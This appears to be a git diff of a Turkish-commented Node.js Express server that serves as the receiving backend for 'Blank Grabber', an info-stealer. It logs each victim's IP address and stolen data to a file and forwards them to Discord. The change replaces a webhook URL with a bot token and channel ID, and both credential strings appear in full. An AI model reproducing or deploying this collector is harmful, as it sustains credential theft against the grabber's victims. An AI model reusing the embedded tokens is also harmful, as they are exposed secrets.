@@ -7,31 +7,45 @@ app.use(express.json({limit:'100mb'}));
 app.use(express.raw({limit:'100mb'}));
 app.use(express.text({limit:'100mb'}));
 
-const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1447266656823939074/L6bY8dExY7Jv2jSspSGNVQTVnMsTZmZ14TzXuJV-MOais4tdIjrrcUirBT9OA5xeHiey';
+const BOT_TOKEN = 'MTQ0NzI2OTkyNDQ1OTUxMTk2OQ.GANDJ5.JcDWdT3pgu1VLC8qm_XYCAh5TDZhnc8s4axGGg';
+const CHANNEL_ID = '1447270065257971813';
 
 app.all('/', async (req, res) => {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || 'unknown';
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || 'bilinmiyor';
     const zaman = new Date().toLocaleString('tr-TR');
     let veri = typeof req.body === 'object' ? JSON.stringify(req.body, null, 2) : req.body?.toString() || 'boş';
 
-    const log = `\n\n╔══════════════════╗\n║ YENİ GRAB GELDİ! ║\n╚══════════════════╝\n⏰ ${zaman}\n🌍 IP: ${ip}\n📦 VERİ:\n${veri}\n`;
+    // Render’da log tut
+    const log = `\n\nYENİ GRAB\n${zaman} | ${ip}\n${veri}\n`;
     fs.appendFileSync('logs.txt', log);
     console.log(log);
 
-    // Blank Grabber’a "ok" de (builder mutlu olsun)
+    // Blank Grabber’a hemen cevap ver (hata vermesin)
     res.send('ok');
 
-    // Aynı veriyi Discord’a da gönder (builder hata vermesin diye)
+    // Botla güzel embed gönder
     try {
-        await fetch(DISCORD_WEBHOOK, {
+        await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {
+                'Authorization': `Bot ${BOT_TOKEN}`,
+                'Content-Type': 'application/json'
+            },
             body: JSON.stringify({
-                content: 'Yeni grab geldi!',
-                embeds: [{ description: `**IP:** ${ip}\n\`\`\`json\n${veri}\n\`\`\``, color: 0x00ff00 }]
+                embeds: [{
+                    title: "🟢 YENİ GRAB GELDİ!",
+                    color: 0x00ff00,
+                    fields: [
+                        { name: "🌍 IP", value: ip, inline: true },
+                        { name: "⏰ Zaman", value: zaman, inline: true }
+                    ],
+                    description: "```json\n" + veri.slice(0,4000) + "\n```",
+                    timestamp: new Date(),
+                    footer: { text: "Blank Grabber • Bot Logger" }
+                }]
             })
         });
-    } catch (e) {}
+    } catch (e) { console.log('Bot gönderim hatası:', e); }
 });
 
-app.listen(process.env.PORT || 3000);
+app.listen(process.env.PORT || 3000, () => console.log('Botlu sistem aktif!'));
